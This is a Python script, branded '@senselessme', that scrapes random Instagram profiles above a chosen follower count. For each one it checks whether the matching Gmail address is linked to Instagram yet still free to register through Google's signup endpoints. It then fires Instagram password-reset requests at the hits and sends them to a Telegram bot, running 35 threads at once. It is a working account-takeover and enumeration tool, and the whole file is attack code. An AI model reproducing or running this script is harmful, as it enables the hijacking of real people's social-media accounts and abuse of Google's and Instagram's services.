import time
from datetime import datetime, timedelta
import sys
import time

AQUA = "\033[38;5;51m"
GOLD = "\033[38;5;220m"
RESET = "\033[0m"

def startup():
    text = "⚡𝕀ℕ𝕀𝕋𝕀𝔸𝕃𝕀ℤ𝕀ℕ𝔾⚡"
    
    for i in range(3):
        for dots in range(4):
            color = AQUA if dots % 2 == 0 else GOLD
            sys.stdout.write(f"\r{color}{text}{'.' * dots}   {RESET}")
            sys.stdout.flush()
            time.sleep(0.1)

    print(f"\n{GOLD}✓ ℝ𝔼𝔸𝔻𝕐 ✓{RESET}")

def loader():
    print(f"{AQUA}\n◆ 𝕊𝕐𝕊𝕋𝔼𝕄 𝔸ℂ𝕋𝕀𝕍𝔼 ◆{RESET}")
    
    for i in range(2):
        bar_color = AQUA if i % 2 == 0 else GOLD
        bar = "" * i + " " * (1 - i)
        sys.stdout.write(f"\r{bar_color}[{bar}] {i*100}%{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    print(f"\n{GOLD}▶ 𝕆ℕ𝕃𝕀ℕ𝔼 ◀{RESET}")

startup()
loader()

RESET = "\033[0m"

BLACK = "\033[30m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
BRIGHT_BLACK = "\033[90m"
BRIGHT_RED = "\033[91m"
BRIGHT_GREEN = "\033[92m"
BRIGHT_YELLOW = "\033[93m"
BRIGHT_BLUE = "\033[94m"
BRIGHT_MAGENTA = "\033[95m"
BRIGHT_CYAN = "\033[96m"
BRIGHT_WHITE = "\033[97m"
BG_BLACK = "\033[40m"
BG_RED = "\033[41m"
BG_GREEN = "\033[42m"
BG_YELLOW = "\033[43m"
BG_BLUE = "\033[44m"
BG_MAGENTA = "\033[45m"
BG_CYAN = "\033[46m"
BG_WHITE = "\033[47m"
BOLD = "\033[1m"
DIM = "\033[2m"
ITALIC = "\033[3m"
UNDERLINE = "\033[4m"
BLINK = "\033[5m"
REVERSE = "\033[7m"
LAVENDER   = "\033[38;5;183m"
SOFT_PINK  = "\033[38;5;218m"
ROSE       = "\033[38;5;211m"
PEACH      = "\033[38;5;216m"
MINT       = "\033[38;5;121m"
AQUA       = "\033[38;5;123m"
SKY_BLUE   = "\033[38;5;117m"
BABY_BLUE  = "\033[38;5;153m"

NEON_PURPLE = "\033[38;5;93m"
NEON_PINK   = "\033[38;5;198m"
NEON_BLUE   = "\033[38;5;39m"
NEON_CYAN   = "\033[38;5;51m"
NEON_GREEN  = "\033[38;5;46m"
NEON_ORANGE = "\033[38;5;208m"

DEEP_PURPLE = "\033[38;5;57m"
MIDNIGHT    = "\033[38;5;17m"
DARK_ROSE   = "\033[38;5;161m"
from datetime import datetime
import sys

expiry_date = datetime(2026, 4, 10, 23, 59, 59)
now = datetime.now()

if now > expiry_date:
    print("\033[1;91m❌ Access Denied Tool Expire Contect @Senselessme!\033[0m")
    sys.exit()

print("\033[1;92m✅ Access Granted!\033[0m")

_a='follower_count'
_Z='en-US,en;q=0.9'
_Y='\x1b[1;32m'
_X='\x1b[2;35m'
_W='\x1b[2;32m'
_V='Cookie'
_U='referer'
_T='origin'
_S='https://www.instagram.com'
_R='Accept-Encoding'
_Q='Content-Type'
_P='\x1b[0m'
_O='\x1b[96m'
_N='\x1b[93m'
_M='\x1b[92m'
_L='__Host-GAPS'
_K='google-accounts-xsrf'
_J='accept'
_I='\x1b[1;31m'
_H='\x1b[1;33m'
_G='lsd'
_F='User-Agent'
_E='\033[0m══════════════════════════════════════════════════════════")'
_D='\x1b[91m'
_C='accept-language'
_B='*/*'
_A='red'
inp=input
fopen=open
rng=range
st=str
pr=print
err=Exception
import requests as R,os,webbrowser
from datetime import datetime
try:import requests as R
except ImportError:os.system('pip install requests');import requests as R
import os,sys,re,json,string as S,cfonts,random as RD,hashlib,uuid,time,gzip,secrets as sc
from datetime import datetime
from threading import Thread as TH
import requests as R
from requests import post as PT
from user_agent import generate_user_agent as GA
from random import choice as CH,randrange as RR
from cfonts import render as CR,say
from colorama import Fore,Style,init
import webbrowser
from datetime import datetime
import sys
A2=_D
A3=_M
A4=_N
B=_O
A5='\x1b[97m'
A6=_P
class CL: GREEN=_M; YELLOW=_N; RED=_D; CYAN=_O
A7=[CL.GREEN,CL.YELLOW,CL.RED,CL.CYAN]
O=[[_A,_A],[_A,_A]]
O,A8=RD.sample(O,2)
import warnings
warnings.filterwarnings("ignore")
try:
    MIN_FOLLOWERS = int(input("Enter min followers target: "))
except:
    MIN_FOLLOWERS = 0
    print("Invalid input, default = 0")
    
LAVENDER  = "\033[38;5;183m"
PINK      = "\033[38;5;218m"
PEACH     = "\033[38;5;216m"
MINT      = "\033[38;5;121m"
SKY       = "\033[38;5;117m"
RESET     = "\033[0m"
LAVENDER = "\033[38;5;183m"
RESET = "\033[0m"

print(f"{YELLOW} ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗ ██╗     {RESET}")
print(f"{YELLOW} ████╗  ██║██╔═══██╗██║   ██║██╔══██╗██║     {RESET}")
print(f"{YELLOW} ██╔██╗ ██║██║   ██║██║   ██║███████║██║     {RESET}")
print(f"{YELLOW} ██║╚██╗██║██║   ██║╚██╗ ██╔╝██╔══██║██║     {RESET}")
print(f"{YELLOW} ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║███████╗{RESET}")
print(f"{YELLOW} ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚══════╝{RESET}")

import warnings
warnings.filterwarnings("ignore")

pr(f"\033[38;5;133mTool by > @senselessme")
pr(_E)

def email_check(mail):
	try:
		url='https://www.instagram.com/api/v1/web/accounts/check_email/'
		headers={'X-Csrftoken':sc.token_hex(16),_F:GA(),_Q:'application/x-www-form-urlencoded','Accept':_B,'Origin':_S,'Referer':'https://www.instagram.com/accounts/signup/email/',_R:'gzip, deflate, br','Accept-Language':'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7'}
		data={'email':mail}
		res=R.post(url,headers=headers,data=data,timeout=10).text
		return 'email_is_taken' in res
	except err as error:
		return False

def pass_reset(fr):
	app_id='1032300900'
	param_key='params'
	try:
		api_url='https://www.instagram.com/async/wbloks/fetch/'
		def gen_ua():
			vers=['13.1.2','13.1.1','13.0.5','12.1.2','12.0.3']
			oss=['Macintosh; Intel Mac OS X 10_15_7','Macintosh; Intel Mac OS X 10_14_6','iPhone; CPU iPhone OS 14_0 like Mac OS X','iPhone; CPU iPhone OS 13_6 like Mac OS X']
			v=RD.choice(vers)
			os_choice=RD.choice(oss)
			return f"Mozilla/5.0 ({os_choice}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{v} Safari/605.1.15 Edg/122.0.0.0"
		params={'appid':'com.bloks.www.caa.ar.search.async','type':'action','__bkv':'cc4d2103131ee3bbc02c20a86f633b7fb7a031cbf515d12d81e0c8ae7af305dd'}
		data={'__d':'www','__user':'0','__a':'1','__req':'9','__hs':'20475.HYP:instagram_web_pkg.2.1...0','dpr':'3','__ccg':'GOOD','__rev':app_id,'__s':'nrgu8k:vm015z:oanvx6','__hsi':'7598106668658828571','__dyn':'7xeUjG1mxu1syUbFp41twpUnwgU29zEdEc8co2qwJw5ux609vCwjE1EE2Cw8G1Qw5Mx62G3i1ywOwv89k2C1Fwc60D82Ixe0EUjwGzEaE2iwNwmE2eUlwhEe87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK1sAwHxW1owLwHwGwa6byohw5yweu','__csr':'gLff3k5T92cDYAyT4Wkxh5bGhjehqjDVuhUCUya8u889hp8ydihrghXG9yGxGm2m9Gu59rxd0KAzy29oKbyUqxyfxOm7VEWfxDKiGgS4Uf98iJ0zGcKEqz89U5G4ry88bxqfzE9UeEGfw34U01oL8dHK0cvN00pOwywQV9o1uO00LYwcjw7Tgvg6Je1rwko2xDg19o68wgwGoaUiw7to66UjgmRw3MXw0yqw0sO8092U0myw','__hsdp':'n0I43m1iQhGIiFckEKrBZvIj2SKUl8FeSE9Q08xyoC0x80sAw1TK0GU3xU1jE31w9y095waN04Uw','__hblp':'0dO0Coco1ME884u9wcC2t0lUbo22wzx61mDw5Pw4OwsoboK0sm0FE620cizU5W0bAz8W0wEGuq08Owc60C80xu2S0H40jy1dwDzo2Ow61w','__sjsp':'n0I43m1iQhGIiFckEKrBZvIRh4rHK5iaqSE0AG9yo','__comet_req':'7',_G:'AdJv3Nfv2cg','jazoest':'2958','__spin_r':app_id,'__spin_b':'trunk','__spin_t':'1769072066','__crn':'comet.igweb.PolarisWebBloksAccountRecoveryRoute',param_key:'{"params":"{\\"server_params\\":{\\"event_request_id\\":\\"3a359125-0214-4c12-9516-8779938e6188\\",\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"47361890900104\\",\\"device_id\\":\\"\\",\\"family_device_id\\":null,\\"waterfall_id\\":\\"69517426-942a-45d2-8ac7-e4f11a60412a\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"context_data\\":\\"Ac_RWrril-QBHwJ5esJkO0r_7Q6DijxM0ntnpV72Xwb9pwsT_1irnjiemlrD4UrE8SZUidlwtGeIAdKnN9x0Yt2xwljNTR9nNNdvl5IBdQTVzfy-m4keAoyj2DJC0XaijIwHZoblRGk2SZCZqPZ2356akgjRVowNkYgDbwOOxTdeBRyLAz7akj7KXpnBIRKbYdGn7zGOhcNzNlMwLmfvjOpjevZSZ-fPAgKvYAqbbU1igFi7kJW7Lmz8ltK5l-jl6iabxQzMgtEi-Nll6Apb4I-H_6OqU1x7ckCuv-pKy_oPMRzNgvz2omC1ELg5fb6FearpkUsZyWEjsFgUGhmkz-WLIA8CNBXJ10VAC1ypksrM6RXfzZKJqtz569eaxG-dw9FLpDJX0-_wgFqzqYKWtJIdB_GZXwpLD2VLOd-aXfHN0SWjWSI|arm\\"},\\"client_input_params\\":{\\"zero_balance_state\\":null,\\"search_query\\":\\"f{1453}\\",\\"fetched_email_list\\":[],\\"fetched_email_token_list\\":{},\\"sso_accounts_auth_data\\":[],\\"sfdid\\":\\"\\",\\"text_input_id\\":\\"7tzaot:101\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"was_headers_prefill_available\\":0,\\"was_headers_prefill_used\\":0,\\"ig_oauth_token\\":[],\\"android_build_type\\":\\"\\",\\"is_whatsapp_installed\\":0,\\"device_network_info\\":null,\\"accounts_list\\":[],\\"is_oauth_without_permission\\":0,\\"search_screen_type\\":\\"email_or_username\\",\\"ig_vetted_device_nonce\\":\\"\\",\\"gms_incoming_call_retriever_eligibility\\":\\"client_not_supported\\",\\"auth_secure_device_id\\":\\"\\",\\"network_bssid\\":null,\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}'}
		headers={_F:gen_ua(),_R:'gzip, deflate, br, zstd','sec-ch-ua-full-version-list':'"Not(A:Brand";v="8.0.0.0", "Chromium";v="144.0.7559.76", "Google Chrome";v="144.0.7559.76"','sec-ch-ua-platform':'"Android"','sec-ch-ua':'"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"','sec-ch-ua-model':'"23090RA98I"','sec-ch-ua-mobile':'?1','sec-ch-prefers-color-scheme':'light','sec-ch-ua-platform-version':'"15.0.0"',_T:_S,'sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty',_U:'https://www.instagram.com/accounts/password/reset/',_C:'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7','priority':'u=1, i',_V:'ig_did=886A3671-95EB-4016-9618-6504E3C60331; mid=aV938wABAAGNLqQD0prSU56ivhek; csrftoken=3xQbJVCm8wRdlSXKaXxztd; datr=HXhfaRa1lVxxpoC1K89YyZiA; ig_nrcb=1; wd=406x766'}
		temp=data[param_key]
		temp=temp.replace('f{1453}',fr)
		data[param_key]=temp
		res=R.post(api_url,params=params,data=data,headers=headers,timeout=15)
		cont=res.content
		try:
			cont=gzip.decompress(cont)
		except:pass
		try:
			cont=brotli.decompress(cont)
		except:pass
		decoded=cont.decode('utf-8',errors='ignore')
		if res.status_code==200:
			return 'Reset done'
		else:
			return 'Reset failed'
	except err as e:
		return f"Reset Error: {st(e)}"

G_URL='https://accounts.google.com'
G_HOST='accounts.google.com'
ref_head=_U
orig_head=_T
auth_head='authority'
ctype_head=_Q
ck_head=_V
ua_head=_F
ctype_val='application/x-www-form-urlencoded; charset=UTF-8'
ctype_val2='application/x-www-form-urlencoded;charset=UTF-8'
token_file='Token.txt'
mail_domain='@gmail.com'
clr_w='\x1b[1;97m'
clr_b='\x1b[1;94m'
clr_c='\x1b[1;96m'
clr_gray='\x1b[1;30m'
clr_y='\x1b[1;33m'
clr_lg='\x1b[2;32m'
clr_r='\x1b[1;31m'
clr_p='\x1b[1;95m'
clr_dim='\x1b[1;90m'
clr_bright='\x1b[38;5;231m'
clr_orange='\x1b[38;5;208m'
cnt_hits=0
cnt_good=0
cnt_bad=0
cnt_skip=0
store={}
bot_key=inp(f"\033[38;5;133m 🤖 Bot Token: \033[38;5;133m")
pr(_E)
chat=inp(f"\033[38;5;133m 💬 Chat ID: \033[38;5;133m")
pr(_E)
time.sleep(2)

try:
    msg = """
━━━━━━━━━━━━━━━━━━━━━━
    ✦  ONLINE ✦  
     ⚡ READY ⚡
━━━━━━━━━━━━━━━━━━━━━━
"""
    R.post(
        f"https://api.telegram.org/bot{bot_key}/sendMessage",
        data={
            'chat_id': chat,
            'text': msg
        },
        timeout=5
    )
except Exception as e:
    print("Telegram Error:", e)

def show_stats():
    WHITE = "\033[97m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

    sys.stdout.write(f"""
{WHITE}━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{YELLOW} ✦  STATS ✦{RESET}
{YELLOW} Hits     : {cnt_hits}{RESET}
{WHITE} Good IG  : {cnt_good}{RESET}
{BLUE} Bad IG   : {cnt_bad}{RESET}
{WHITE}━━━━━━━━━━━━━━━━━━━━━━━{RESET}

""")
    sys.stdout.flush()

def gen_token():
	try:
		chars='azertyuiopmlkjhgfdsqwxcvbn'
		r1=''.join(CH(chars)for _ in rng(RR(6,9)))
		r2=''.join(CH(chars)for _ in rng(RR(3,9)))
		r3=''.join(CH(chars)for _ in rng(RR(15,30)))
		h={_J:_B,_C:'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',_Q:ctype_val2,_K:'1',_F:st(GA())}
		url=f"{G_URL}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
		res=R.get(url,headers=h)
		match=re.search('data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',res.text).group(2)
		ck={_L:r3}
		h2={auth_head:G_HOST,_J:_B,_C:_Z,_Q:ctype_val2,_K:'1',orig_head:G_URL,ref_head:'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',_F:GA()}
		d={'f.req':f'["{match}","{r1}","{r2}","{r1}","{r2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'}
		resp=R.post(f"{G_URL}/_/signup/validatepersonaldetails",cookies=ck,headers=h2,data=d)
		token=st(resp.text).split('",null,"')[1].split('"')[0]
		cval=resp.cookies.get_dict()[_L]
		with fopen(token_file,'w')as f:
			f.write(f"{token}//{cval}\n")
	except err as e:
		pr(e)
gen_token()

def check_user(email):
	sp='@'
	email_clean=email
	global cnt_skip,cnt_hits
	try:
		if sp in email_clean:
			email_clean=email_clean.split(sp)[0]
		with fopen(token_file,'r')as f:
			line=f.read().splitlines()[0]
		token,cookie=line.split('//')
		ck={_L:cookie}
		h={auth_head:G_HOST,_J:_B,_C:_Z,_Q:ctype_val2,_K:'1',orig_head:G_URL,ref_head:f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={token}",_F:GA()}
		params={'TL':token}
		data=f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{token}%22%2C%22{email_clean}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&"
		resp=PT(f"{G_URL}/_/signup/usernameavailability",params=params,cookies=ck,headers=h,data=data)
		if'"gf.uar",1'in resp.text:
			cnt_hits+=1
			show_stats()
			full=email_clean+mail_domain
			user_part,dom_part=full.split(sp)
			save_hit(user_part,dom_part)
		else:
			cnt_skip+=1
			show_stats()
	except err:pass

def validate_mail(email):
	mail=email
	global cnt_good,cnt_bad
	try:
		res=email_check(mail)
		if res:
			if mail_domain in mail:
				check_user(mail)
			cnt_good+=1
			show_stats()
		else:
			cnt_bad+=1
			show_stats()
	except err as e:
		cnt_bad+=1
		show_stats()
		
def reset_cmd(user):
	try:
		res=pass_reset(user)
		return res
	except err as e:
		return f"Reset Error: {st(e)}"

def get_acc_year(followers):
	try:
		data=[(1279000,2010),(17750000,2011),(279760000,2012),(900990000,2013),(1629010000,2014),(2500000000,2015),(3713668786,2016),(5699785217,2017),(8597939245,2018),(21254029834,2019)]
		for(count,year)in data:
			if followers<=count:
				return year
		return 2023
	except err:pass

def save_hit(username,domain):
	user=username
	global cnt_hits
	info=store.get(user,{})
	pk=info.get('pk')
	full=info.get('full_name')
	followers=info.get(_a)
	following=info.get('following_count')
	posts=info.get('media_count')
	bio=info.get('biography')
	
	out=f"""
────────────────────────
✦  HIT ✦
────────────────────────
✦ Username > @{user}
✦ Domain > {user}@{domain}
✦ Followers > {followers}
✦ Following > {following}
✦ Posts > {posts}
✦ Bio > {bio}
✦ Reset > {reset_cmd(user)}
✦ Meta > Yes
✦ Profile > https://www.instagram.com/{user}/
────────────────────────
  @senselessme
────────────────────────
"""
	with fopen('_hits.txt','a')as f:
		f.write(out+'\n')
	try:
		R.get(f"https://api.telegram.org/bot{bot_key}/sendMessage?chat_id={chat}&text={out}")
	except:pass

def scraper():
	while True:
		payload={_G:''.join(RD.choices(S.ascii_letters+S.digits,k=32)),'variables':json.dumps({'id':int(RD.randrange(3713668786,21254029834)),'render_surface':'PROFILE'}),'doc_id':'25618261841150840'}
		headers={'X-FB-LSD':payload[_G]}
		try:
			res=R.post('https://www.instagram.com/api/graphql',headers=headers,data=payload)
			data=res.json().get('data',{}).get('user',{})
			user=data.get('username')
			if user:
				fcnt = data.get(_a,0)
				if fcnt < MIN_FOLLOWERS:
					continue
				store[user]=data
				emails=[user+mail_domain]
				for mail in emails:
					validate_mail(mail)
		except Exception:
			pass
			
import time

WHITE = "\033[1;97m"
YELLOW = "\033[1;33m"
RESET = "\033[0m"

print(f"""{BLUE}━━━━━━━━━━━━━━━━━━━━━
   {WHITE}━━━  ━━━━
{YELLOW}━━━━━━━━━━━━━━━━━━━━━
{WHITE}1) SINGLE MODE 
2) MULTI MODE 
{RED}━━━━━━━━━━━━━━━━━━━━━
 SAFE USAGE  
{BLUE}━━━━━━━━━━━━━━━━━━━━━{RESET}""")

opt = input(f"{YELLOW}Select option: {RESET}")

if opt == "1":
    delay = 0.2

elif opt == "2":
    delay = 0.3

elif opt == "":
    delay = 0
    print(f"""{WHITE}
━━━━━━━━━━━━━━━━━━━━━
{YELLOW}✦ BEAST MODE ACTIVE ✦  
{WHITE}━━━━━━━━━━━━━━━━━━━━━{RESET}
""")

else:
    print(f"{YELLOW}Invalid → default SINGLE MODE{RESET}")
    delay = 0.2

speed_txt = "NO DELAY" if delay == 0 else delay
print(f"{BLUE}Speed: {speed_txt}{RESET}\n")

for _ in range(35):
    TH(target=scraper).start()
    if delay > 0:
        time.sleep(delay)